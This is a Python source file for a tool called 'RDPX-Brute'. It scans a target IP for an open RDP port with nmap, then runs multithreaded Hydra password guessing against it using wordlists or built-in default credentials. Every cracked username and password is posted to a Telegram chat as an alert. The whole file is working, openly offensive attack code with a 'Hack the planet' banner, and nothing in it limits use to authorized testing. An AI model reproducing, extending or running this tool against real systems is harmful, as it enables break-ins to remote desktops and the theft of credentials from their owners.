#!/usr/bin/env python3
import argparse
import subprocess
import sys
import os
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from threading import Lock
import requests
from tqdm import tqdm
from colorama import init, Fore, Back, Style
from pyfiglet import Figlet

# Initialize colorama
init(autoreset=True)

# === CONFIGURE YOUR TELEGRAM BOT TOKEN & CHAT ID HERE ===
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

DEFAULT_USERNAMES = ["Administrator", "admin", "user", "test"]
DEFAULT_PASSWORDS = ["Password123", "Spring2025", "admin", "123456", "welcome"]

found_users = set()
lock = Lock()

# Custom Figlet font for hacky banner
fig = Figlet(font='slant')

def banner():
    art = fig.renderText('RDPX-Brute')
    header = Fore.CYAN + Style.BRIGHT + art
    sub = Fore.MAGENTA + "[»] Hack the planet: RDP Hydra + Telegram Alerts"
    print(header + sub + Style.RESET_ALL + '\n')


def send_telegram_message(bot_token, chat_id, message):
    print(Fore.YELLOW + "[→] Sending Telegram Alert..." + Style.RESET_ALL)
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    try:
        resp = requests.post(url, data=data, timeout=10)
        if resp.status_code == 200:
            print(Fore.GREEN + "✔ Telegram alert sent" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"✖ Telegram API error: {resp.status_code}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"✖ Telegram send error: {e}" + Style.RESET_ALL)


def run_nmap_rdp_scan(ip):
    print(Fore.YELLOW + f"[→] Scanning {ip} for RDP port 3389..." + Style.RESET_ALL)
    try:
        result = subprocess.run(
            ["nmap", "-p", "3389", "--open", "--script", "rdp-ntlm-info,rdp-enum-encryption", ip],
            capture_output=True, text=True, timeout=60
        )
        print(Fore.BLUE + result.stdout + Style.RESET_ALL)
        return "3389/tcp open" in result.stdout
    except subprocess.TimeoutExpired:
        print(Fore.RED + "✖ Nmap scan timed out" + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.RED + f"✖ Nmap error: {e}" + Style.RESET_ALL)
        return False


def load_dict_file(path):
    print(Fore.YELLOW + f"[→] Loading dictionary: {path}" + Style.RESET_ALL)
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        with open(path, "r", encoding="latin-1") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"✖ Error loading file {path}: {e}" + Style.RESET_ALL)
        sys.exit(1)


def hydra_worker(ip, user, pwd, progress_bar):
    with lock:
        progress_bar.update(1)
    cmd = ["hydra", "-t", "1", "-f", "-V", "-l", user, "-p", pwd, f"rdp://{ip}"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    except subprocess.TimeoutExpired:
        return None
    except Exception as e:
        print(Fore.RED + f"✖ Exception: {e}" + Style.RESET_ALL)
        return None
    if result.returncode == 0 and "login:" in result.stdout:
        print(Back.GREEN + Fore.BLACK + f" [VALID] {user}:{pwd} " + Style.RESET_ALL)
        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
                              f"🚨 VALID RDP creds! {user}:{pwd} on {ip}")
        return (user, pwd)
    return None


def hydra_bruteforce(ip, usernames, passwords, threads=10, batch_size=200):
    total = len(usernames) * len(passwords)
    valid = []
    global found_users
    found_users = set()
    print(Fore.MAGENTA + f"[→] Starting Hydra brute-force: {total} attempts with {threads} threads" + Style.RESET_ALL)
    bar = tqdm(total=total, desc=Fore.CYAN+"Brute-Force"+Style.RESET_ALL, unit="try")
    executor = ThreadPoolExecutor(max_workers=threads)
    futures = set()
    try:
        for u in usernames:
            if u in found_users: continue
            for p in passwords:
                if u in found_users: break
                futures.add(executor.submit(hydra_worker, ip, u, p, bar))
                while len(futures) >= batch_size:
                    done, futures = wait(futures, return_when=FIRST_COMPLETED)
                    for f in done:
                        r = f.result()
                        if r:
                            found_users.add(r[0]); valid.append(r)
        while futures:
            done, futures = wait(futures, return_when=FIRST_COMPLETED)
            for f in done:
                r = f.result()
                if r:
                    found_users.add(r[0]); valid.append(r)
    except KeyboardInterrupt:
        print(Fore.RED+"\n[!] Interrupted by user. Exiting..."+Style.RESET_ALL)
        executor.shutdown(wait=False, cancel_futures=True)
        bar.close(); os._exit(0)
    else:
        executor.shutdown(wait=True, cancel_futures=True)
    bar.close(); return valid


def main():
    banner();
    p = argparse.ArgumentParser(description="🚀 RDPX Brute + Alerts")
    p.add_argument("target_ip"); p.add_argument("--dict"); p.add_argument("--user"); p.add_argument("--userdict");
    p.add_argument("--threads", type=int, default=10); p.add_argument("--batch", type=int, default=200)
    args = p.parse_args(); ip=args.target_ip

    # Users
    if args.user: users=[args.user]; print(Fore.YELLOW+f"[>] User: {args.user}"+Style.RESET_ALL)
    elif args.userdict: users=load_dict_file(args.userdict)
    else: users=DEFAULT_USERNAMES
    # Passwords
    if args.dict: pw=load_dict_file(args.dict)
    else: pw=DEFAULT_PASSWORDS

    if not run_nmap_rdp_scan(ip): sys.exit(0)
    creds = hydra_bruteforce(ip, users, pw, threads=args.threads, batch_size=args.batch)

    if creds:
        print(Fore.GREEN+Style.BRIGHT+"[✔] Found valid credentials:"+Style.RESET_ALL)
        for u,p in creds: print(Fore.GREEN+f"   • {u}:{p}"+Style.RESET_ALL)
    else:
        print(Fore.RED+"[✖] No valid credentials."+Style.RESET_ALL)

if __name__ == "__main__": main()
